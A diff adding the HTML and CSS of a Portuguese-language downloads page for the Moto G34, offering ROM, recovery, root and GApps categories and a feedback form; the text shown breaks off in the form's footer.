@@ -1,0 +1,1872 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Downloads - Moto G34</title>
+  <link rel="icon" type="image/png" href="iconindex.png">
+  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <style>
+    :root {
+      --primary-color: #FF1B2D;
+      --secondary-color: #722ED1;
+      --accent-color: #00D9FF;
+      --dark-bg: #0A0E1A;
+      --card-bg: rgba(20, 20, 35, 0.8);
+      --text-light: #FFFFFF;
+      --text-secondary: #B0B0B0;
+      --neon-blue: #00D9FF;
+      --neon-pink: #FF1B2D;
+      --neon-purple: #722ED1;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Rajdhani', 'Roboto', sans-serif;
+    }
+
+    body {
+      background-color: var(--dark-bg);
+      color: var(--text-light);
+      min-height: 100vh;
+      background-image: 
+        radial-gradient(circle at 10% 20%, rgba(114, 46, 209, 0.2) 0%, transparent 50%),
+        radial-gradient(circle at 90% 80%, rgba(0, 217, 255, 0.2) 0%, transparent 50%),
+        radial-gradient(circle at 50% 50%, rgba(255, 27, 45, 0.1) 0%, transparent 50%);
+      background-attachment: fixed;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    ::-webkit-scrollbar {
+      width: 12px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: rgba(20, 20, 35, 0.5);
+      border-radius: 10px;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: linear-gradient(180deg, var(--neon-blue), var(--neon-pink));
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 217, 255, 0.5);
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      box-shadow: 0 0 15px rgba(255, 27, 45, 0.7);
+    }
+
+    .notification-bell {
+      position: fixed;
+      top: 20px;
+      right: 80px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-light);
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      z-index: 100;
+    }
+
+    .notification-bell:hover {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: var(--neon-blue);
+      box-shadow: 0 0 15px rgba(0, 217, 255, 0.3);
+      transform: translateY(-3px);
+    }
+
+    .notification-bell.has-notification::after {
+      content: '';
+      position: absolute;
+      top: 5px;
+      right: 5px;
+      width: 10px;
+      height: 10px;
+      background-color: var(--primary-color);
+      border-radius: 50%;
+      border: 2px solid var(--dark-bg);
+      box-shadow: 0 0 10px var(--primary-color);
+      animation: pulse 2s infinite;
+    }
+
+    .theme-picker {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-light);
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      z-index: 100;
+    }
+
+    .theme-picker:hover {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: var(--neon-blue);
+      box-shadow: 0 0 15px rgba(0, 217, 255, 0.3);
+      transform: translateY(-3px);
+    }
+
+    .theme-options {
+      position: fixed;
+      top: 75px;
+      right: 20px;
+      background: rgba(20, 20, 35, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      padding: 15px;
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+      z-index: 99;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+
+    .theme-options.active {
+      display: flex;
+    }
+
+    .theme-option {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 15px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .theme-option:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    .theme-color {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+    }
+
+    .theme-default .theme-color {
+      background: #FF1B2D;
+    }
+
+    .theme-red .theme-color {
+      background: #FF1B2D;
+    }
+
+    .theme-blue .theme-color {
+      background: #0066FF;
+    }
+
+    .theme-green .theme-color {
+      background: #00C853;
+    }
+
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 0 0 0 rgba(255, 27, 45, 0.7);
+      }
+      70% {
+        box-shadow: 0 0 0 10px rgba(255, 27, 45, 0);
+      }
+      100% {
+        box-shadow: 0 0 0 0 rgba(255, 27, 45, 0);
+      }
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      opacity: 0;
+      animation: initialFadeIn 1s ease forwards;
+    }
+
+    @keyframes initialFadeIn {
+      to {
+        opacity: 1;
+      }
+    }
+
+    main {
+      padding-top: 80px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .device-selection {
+      width: 100%;
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 20px;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 0.8s ease forwards;
+      animation-delay: 0.2s;
+    }
+
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .selection-header {
+      text-align: center;
+      margin-bottom: 50px;
+    }
+
+    .selection-title {
+      font-size: 3.5rem;
+      font-weight: bold;
+      background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink), var(--neon-purple));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 15px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      text-shadow: 0 0 30px rgba(0, 217, 255, 0.3);
+    }
+
+    .selection-subtitle {
+      font-size: 1.3rem;
+      color: var(--text-secondary);
+      margin-bottom: 30px;
+    }
+
+    .device-cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 30px;
+      margin-bottom: 40px;
+    }
+
+    .device-card {
+      position: relative;
+      background: linear-gradient(135deg, rgba(20, 20, 35, 0.9), rgba(30, 30, 50, 0.9));
+      border-radius: 20px;
+      overflow: hidden;
+      transition: all 0.3s ease;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      opacity: 0;
+      transform: translateY(30px);
+      height: 400px;
+      display: flex;
+      flex-direction: column;
+      clip-path: polygon(0 0, 100% 0, 100% 85%, 85% 100%, 0 100%);
+    }
+
+    .device-card.show {
+      animation: slideUp 0.6s ease forwards;
+    }
+
+    @keyframes slideUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .device-card:hover {
+      transform: translateY(-10px) scale(1.02);
+      box-shadow: 0 20px 40px rgba(0, 217, 255, 0.4);
+      border-color: var(--neon-blue);
+      background: linear-gradient(135deg, rgba(20, 20, 35, 0.95), rgba(40, 40, 60, 0.95));
+    }
+
+    .device-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink), var(--neon-purple));
+      border-radius: 4px 4px 0 0;
+    }
+
+    .device-card::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      width: 50px;
+      height: 50px;
+      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      clip-path: polygon(100% 0, 0 100%, 100% 100%);
+    }
+
+    .device-image-container {
+      height: 180px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .device-image {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      transition: all 0.3s ease;
+    }
+
+    .device-card:hover .device-image {
+      transform: scale(1.05);
+    }
+
+    .device-info {
+      padding: 25px;
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .device-name {
+      font-size: 1.8rem;
+      margin-bottom: 15px;
+      color: var(--text-light);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .device-name .material-icons {
+      color: var(--primary-color);
+      filter: drop-shadow(0 0 5px var(--primary-color));
+    }
+
+    .device-description {
+      color: var(--text-secondary);
+      margin-bottom: 20px;
+      font-size: 1rem;
+      line-height: 1.5;
+      flex-grow: 1;
+    }
+
+    .device-specs {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .device-spec {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-secondary);
+      padding: 8px 15px;
+      border-radius: 50px;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .device-spec .material-icons {
+      font-size: 1rem;
+      color: var(--accent-color);
+    }
+
+    .more-tools-card {
+      position: relative;
+      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      border-radius: 20px;
+      padding: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(255, 27, 45, 0.3);
+      opacity: 0;
+      transform: translateY(30px);
+      height: 400px;
+      clip-path: polygon(0 0, 100% 0, 100% 85%, 85% 100%, 0 100%);
+    }
+
+    .more-tools-card.show {
+      animation: slideUp 0.6s ease forwards;
+      animation-delay: 0.2s;
+    }
+
+    .more-tools-card::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        45deg,
+        transparent,
+        rgba(255, 255, 255, 0.1),
+        transparent
+      );
+      transform: rotate(45deg);
+      animation: shine 3s infinite;
+      pointer-events: none;
+    }
+
+    @keyframes shine {
+      0% {
+        transform: translateX(-100%) translateY(-100%) rotate(45deg);
+      }
+      100% {
+        transform: translateX(100%) translateY(100%) rotate(45deg);
+      }
+    }
+
+    .more-tools-card:hover {
+      transform: translateY(-10px) scale(1.02);
+      box-shadow: 0 20px 40px rgba(255, 27, 45, 0.5);
+    }
+
+    .more-tools-card::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      width: 50px;
+      height: 50px;
+      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      clip-path: polygon(100% 0, 0 100%, 100% 100%);
+    }
+
+    .more-tools-icon {
+      font-size: 4rem;
+      margin-bottom: 20px;
+      color: var(--text-light);
+      filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.5));
+    }
+
+    .more-tools-title {
+      font-size: 2rem;
+      font-weight: bold;
+      margin-bottom: 15px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .more-tools-description {
+      font-size: 1.1rem;
+      max-width: 80%;
+    }
+
+    .category-selection {
+      width: 100%;
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 20px;
+      display: none;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 0.8s ease forwards;
+    }
+
+    .category-header {
+      text-align: center;
+      margin-bottom: 50px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .category-title {
+      font-size: 3rem;
+      font-weight: bold;
+      background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink), var(--neon-purple));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 15px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    .category-subtitle {
+      font-size: 1.2rem;
+      color: var(--text-secondary);
+      margin-bottom: 30px;
+    }
+
+    .back-button {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-light);
+      padding: 12px 25px;
+      border-radius: 50px;
+      cursor: pointer;
+      font-size: 1rem;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .back-button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: var(--neon-blue);
+      box-shadow: 0 0 15px rgba(0, 217, 255, 0.3);
+      transform: translateY(-3px);
+    }
+
+    .category-cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 30px;
+    }
+
+    .category-card {
+      position: relative;
+      background: linear-gradient(135deg, rgba(20, 20, 35, 0.9), rgba(30, 30, 50, 0.9));
+      border-radius: 20px;
+      overflow: hidden;
+      transition: all 0.3s ease;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      opacity: 0;
+      transform: translateY(30px);
+      height: 300px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 30px;
+      clip-path: polygon(0 0, 100% 0, 100% 85%, 85% 100%, 0 100%);
+    }
+
+    .category-card.show {
+      animation: slideUp 0.6s ease forwards;
+    }
+
+    .category-card:hover {
+      transform: translateY(-10px) scale(1.02);
+      box-shadow: 0 20px 40px rgba(0, 217, 255, 0.4);
+      border-color: var(--neon-blue);
+      background: linear-gradient(135deg, rgba(20, 20, 35, 0.95), rgba(40, 40, 60, 0.95));
+    }
+
+    .category-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink), var(--neon-purple));
+      border-radius: 4px 4px 0 0;
+    }
+
+    .category-card::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      width: 50px;
+      height: 50px;
+      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      clip-path: polygon(100% 0, 0 100%, 100% 100%);
+    }
+
+    .category-icon {
+      font-size: 3.5rem;
+      margin-bottom: 20px;
+      color: var(--primary-color);
+      filter: drop-shadow(0 0 10px var(--primary-color));
+    }
+
+    .category-name {
+      font-size: 1.8rem;
+      margin-bottom: 15px;
+      color: var(--text-light);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .category-description {
+      color: var(--text-secondary);
+      font-size: 1rem;
+      line-height: 1.5;
+    }
+
+    .feedback-button {
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
+      border: none;
+      color: white;
+      padding: 15px 25px;
+      border-radius: 50px;
+      cursor: pointer;
+      font-size: 1rem;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 20px rgba(114, 46, 209, 0.4);
+      z-index: 99;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .feedback-button:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 30px rgba(114, 46, 209, 0.6);
+    }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0, 0, 0, 0.8);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+
+    .modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .modal {
+      background: linear-gradient(135deg, rgba(20, 20, 35, 0.95), rgba(30, 30, 50, 0.95));
+      border-radius: 20px;
+      width: 100%;
+      max-width: 600px;
+      max-height: 90vh;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .modal-overlay.active .modal {
+      transform: scale(1);
+    }
+
+    .modal-header {
+      padding: 25px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .modal-title {
+      font-size: 1.8rem;
+      font-weight: bold;
+      color: var(--text-light);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .modal-close {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-light);
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .modal-close:hover {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: var(--neon-pink);
+      box-shadow: 0 0 15px rgba(255, 27, 45, 0.3);
+      transform: rotate(90deg);
+    }
+
+    .modal-body {
+      padding: 25px;
+      overflow-y: auto;
+      flex: 1;
+    }
+
+    .modal-footer {
+      padding: 25px;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      display: flex;
+      justify-content: flex-end;
+      gap: 15px;
+    }
+
+    .form-group {
+      margin-bottom: 25px;
+    }
+
+    .form-label {
+      display: block;
+      margin-bottom: 10px;
+      color: var(--text-light);
+      font-weight: 600;
+      font-size: 1.1rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .form-input,
+    .form-textarea,
+    .form-select {
+      width: 100%;
+      padding: 15px 20px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      color: var(--text-light);
+      font-size: 1rem;
+      transition: all 0.3s ease;
+    }
+
+    .form-input:focus,
+    .form-textarea:focus,
+    .form-select:focus {
+      outline: none;
+      border-color: var(--neon-blue);
+      box-shadow: 0 0 15px rgba(0, 217, 255, 0.3);
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    .form-select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23FFFFFF' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 15px center;
+      padding-right: 40px;
+    }
+
+    .form-select option {
+      background: var(--dark-bg);
+      color: var(--text-light);
+    }
+
+    .form-textarea {
+      min-height: 120px;
+      resize: vertical;
+    }
+
+    .form-checkbox {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    .toggle-switch {
+      position: relative;
+      width: 60px;
+      height: 30px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .toggle-switch input {
+      display: none;
+    }
+
+    .toggle-slider {
+      position: absolute;
+      top: 3px;
+      left: 3px;
+      width: 24px;
+      height: 24px;
+      background: var(--text-secondary);
+      border-radius: 50%;
+      transition: all 0.3s ease;
+    }
+
+    .toggle-switch input:checked + .toggle-slider {
+      transform: translateX(30px);
+      background: var(--primary-color);
+      box-shadow: 0 0 10px var(--primary-color);
+    }
+
+    .toggle-switch input:checked ~ .toggle-switch {
+      background: rgba(255, 27, 45, 0.2);
+    }
+
+    .modal-button {
+      padding: 12px 25px;
+      border-radius: 50px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      border: none;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .modal-button-secondary {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-light);
+    }
+
+    .modal-button-secondary:hover {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: var(--neon-blue);
+      box-shadow: 0 0 15px rgba(0, 217, 255, 0.3);
+    }
+
+    .modal-button-primary {
+      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+      color: white;
+      box-shadow: 0 5px 15px rgba(255, 27, 45, 0.3);
+    }
+
+    .modal-button-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 25px rgba(255, 27, 45, 0.5);
+    }
+
+    .notification {
+      position: fixed;
+      top: 30px;
+      right: 30px;
+      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+      color: white;
+      padding: 20px 30px;
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      transform: translateX(200%);
+      transition: transform 0.4s ease;
+      z-index: 2000;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      max-width: 400px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .notification.show {
+      transform: translateX(0);
+    }
+
+    .notification-icon {
+      font-size: 1.5rem;
+    }
+
+    .notification-content {
+      flex: 1;
+    }
+
+    .notification-title {
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .notification-message {
+      font-size: 0.9rem;
+    }
+
+    .notification-close {
+      background: none;
+      border: none;
+      color: white;
+      cursor: pointer;
+      font-size: 1.2rem;
+    }
+
+    .orb {
+      position: fixed;
+      top: -10px;
+      z-index: 1;
+      user-select: none;
+      cursor: default;
+      animation: orbFall linear infinite;
+      border-radius: 50%;
+      box-shadow: 0 0 10px var(--primary-color);
+    }
+
+    @keyframes orbFall {
+      0% {
+        transform: translateY(-100px) rotate(0deg);
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(calc(100vh + 100px)) rotate(360deg);
+        opacity: 0;
+      }
+    }
+
+    .loader-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(10, 14, 26, 0.95);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+
+    .loader-container.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .loader {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      --color: var(--primary-color);
+      --animation: 2s ease-in-out infinite;
+    }
+
+    .loader .circle {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      width: 20px;
+      height: 20px;
+      border: solid 2px var(--color);
+      border-radius: 50%;
+      margin: 0 10px;
+      background-color: transparent;
+      animation: circle-keys var(--animation);
+    }
+
+    .loader .circle .dot {
+      position: absolute;
+      transform: translate(-50%, -50%);
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background-color: var(--color);
+      animation: dot-keys var(--animation);
+    }
+
+    .loader .circle .outline {
+      position: absolute;
+      transform: translate(-50%, -50%);
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      animation: outline-keys var(--animation);
+    }
+
+    .circle:nth-child(2) {
+      animation-delay: 0.3s;
+    }
+
+    .circle:nth-child(3) {
+      animation-delay: 0.6s;
+    }
+
+    .circle:nth-child(4) {
+      animation-delay: 0.9s;
+    }
+
+    .circle:nth-child(2) .dot {
+      animation-delay: 0.3s;
+    }
+
+    .circle:nth-child(3) .dot {
+      animation-delay: 0.6s;
+    }
+
+    .circle:nth-child(4) .dot {
+      animation-delay: 0.9s;
+    }
+
+    .circle:nth-child(1) .outline {
+      animation-delay: 0.9s;
+    }
+
+    .circle:nth-child(2) .outline {
+      animation-delay: 1.2s;
+    }
+
+    .circle:nth-child(3) .outline {
+      animation-delay: 1.5s;
+    }
+
+    .circle:nth-child(4) .outline {
+      animation-delay: 1.8s;
+    }
+
+    @keyframes circle-keys {
+      0% {
+        transform: scale(1);
+        opacity: 1;
+      }
+
+      50% {
+        transform: scale(1.5);
+        opacity: 0.5;
+      }
+
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    @keyframes dot-keys {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(0);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    @keyframes outline-keys {
+      0% {
+        transform: scale(0);
+        outline: solid 20px var(--color);
+        outline-offset: 0;
+        opacity: 1;
+      }
+
+      100% {
+        transform: scale(1);
+        outline: solid 0 transparent;
+        outline-offset: 20px;
+        opacity: 0;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .selection-title {
+        font-size: 2.5rem;
+      }
+      
+      .device-cards {
+        grid-template-columns: 1fr;
+      }
+      
+      .category-cards {
+        grid-template-columns: 1fr;
+      }
+      
+      .modal {
+        max-width: 100%;
+        border-radius: 15px;
+      }
+      
+      .feedback-button {
+        bottom: 15px;
+        right: 15px;
+        padding: 12px 20px;
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <button class="icon-button notification-bell has-notification" id="notificationBell" aria-label="Notificações">
+    <span class="material-icons">notifications</span>
+  </button>
+
+  <button class="theme-picker" id="themePicker" aria-label="Escolher tema">
+    <span class="material-icons">palette</span>
+  </button>
+
+  <div class="theme-options" id="themeOptions">
+    <div class="theme-option theme-default" data-theme="default">
+      <div class="theme-color"></div>
+      <span>Padrão</span>
+    </div>
+    <div class="theme-option theme-red" data-theme="red">
+      <div class="theme-color"></div>
+      <span>Red</span>
+    </div>
+    <div class="theme-option theme-blue" data-theme="blue">
+      <div class="theme-color"></div>
+      <span>Blue</span>
+    </div>
+    <div class="theme-option theme-green" data-theme="green">
+      <div class="theme-color"></div>
+      <span>Green</span>
+    </div>
+  </div>
+
+  <div class="loader-container" id="loaderContainer">
+    <div class="loader">
+      <div class="circle">
+        <div class="dot"></div>
+        <div class="outline"></div>
+      </div>
+      <div class="circle">
+        <div class="dot"></div>
+        <div class="outline"></div>
+      </div>
+      <div class="circle">
+        <div class="dot"></div>
+        <div class="outline"></div>
+      </div>
+      <div class="circle">
+        <div class="dot"></div>
+        <div class="outline"></div>
+      </div>
+    </div>
+  </div>
+
+  <main>
+    <div class="device-selection" id="deviceSelection">
+      <div class="selection-header">
+        <h2 class="selection-title">Downloads para seu dispositivo</h2>
+        <p class="selection-subtitle">Selecione seu celular para ver o que temos pra ele!</p>
+      </div>
+      
+      <div class="device-cards">
+        <div class="device-card" data-device="motog34">
+          <div class="device-image-container">
+            <img src="g34.png" alt="Moto G34" class="device-image">
+          </div>
+          <div class="device-info">
+            <h3 class="device-name">
+              <span class="material-icons">smartphone</span>
+              Moto G34
+            </h3>
+            <p class="device-description">Fogos...</p>
+            <div class="device-specs">
+              <div class="device-spec">
+                <span class="material-icons">memory</span>
+                <span>4GB/8GB RAM</span>
+              </div>
+              <div class="device-spec">
+                <span class="material-icons">sd_storage</span>
+                <span>128/256GB</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="more-tools-card" data-category="tools">
+          <span class="material-icons more-tools-icon">build_circle</span>
+          <h3 class="more-tools-title">Mais ferramentas!</h3>
+          <p class="more-tools-description">Mais ferramentas para te ajudar no seu celular</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="category-selection" id="categorySelection">
+      <div class="category-header">
+        <h2 class="category-title">Selecione uma categoria</h2>
+        <p class="category-subtitle">Escolha o tipo de download que você procura</p>
+        <button class="back-button" id="backToDevices">
+          <span class="material-icons">arrow_back</span>
+          Voltar para dispositivos
+        </button>
+      </div>
+      
+      <div class="category-cards">
+        <div class="category-card" data-category="roms">
+          <span class="material-icons category-icon">android</span>
+          <h3 class="category-name">ROMs</h3>
+          <p class="category-description">Novo sistema, novo estilo, escolha sua ROM!</p>
+        </div>
+        
+        <div class="category-card" data-category="recoverys">
+          <span class="material-icons category-icon">settings_backup_restore</span>
+          <h3 class="category-name">Recoverys</h3>
+          <p class="category-description">Recuperação personalizada</p>
+        </div>
+        
+        <div class="category-card" data-category="roots">
+          <span class="material-icons category-icon">security</span>
+          <h3 class="category-name">Roots</h3>
+          <p class="category-description">Tenha o controle total do seu Android!</p>
+        </div>
+        
+        <div class="category-card" data-category="gapps">
+          <span class="material-icons category-icon">apps</span>
+          <h3 class="category-name">GApps</h3>
+          <p class="category-description">Use os aplicativos do google em seu sistema</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <button class="feedback-button" id="feedbackButton">
+    <span class="material-icons">feedback</span>
+    Feedback
+  </button>
+
+  <div class="modal-overlay" id="feedbackModalOverlay">
+    <div class="modal">
+      <div class="modal-header">
+        <h3 class="modal-title">Enviar ideias, críticas, melhorias...</h3>
+        <button class="modal-close" id="feedbackModalClose">
+          <span class="material-icons">close</span>
+        </button>
+      </div>
+      
+      <div class="modal-body">
+        <form id="feedbackForm">
+          <div class="form-group">
+            <label class="form-label" for="feedbackType">Tipo de Sugestão</label>
+            <select class="form-select" id="feedbackType" required>
+              <option value="">Selecione uma opção</option>
+              <option value="suggestion">Sugestão</option>
+              <option value="bug">Relatório de Bug</option>
+              <option value="improvement">Melhoria</option>
+              <option value="other">Outro</option>
+            </select>
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label" for="feedbackName">Seu Nome (Opcional)</label>
+            <input type="text" class="form-input" id="feedbackName" placeholder="Deixe em branco para enviar anonimamente">
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label" for="feedbackMessage">Mensagem</label>
+            <textarea class="form-textarea" id="feedbackMessage" placeholder="Fale mais sobre sua sugestão!" required></textarea>
+          </div>
+          
+          <div class="form-checkbox">
+            <label class="toggle-switch">
+              <input type="checkbox" id="feedbackAnonymous">
+              <span class="toggle-slider"></span>
+            </label>
+            <label for="feedbackAnonymous">Enviar anonimamente</label>
+          </div>
+        </form>
+      </div>
+      
+      <div class="modal-footer">
